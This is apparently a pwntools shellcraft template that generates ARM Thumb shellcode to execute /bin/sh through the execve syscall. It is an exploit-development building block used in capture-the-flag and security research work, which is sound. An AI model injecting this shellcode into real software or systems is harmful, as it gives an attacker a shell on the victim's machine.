<% from pwnlib.shellcraft.thumb import mov %>
<%docstring>Execute /bin/sh</%docstring>

  adr r0, execve_addr
  ${mov('r2', 0)}
  ${mov('r7', 'SYS_execve')}
  push {r0, r2}
  mov r1, sp
  svc 1
  .balign 4, 1
execve_addr:
  .ascii "/bin/sh"
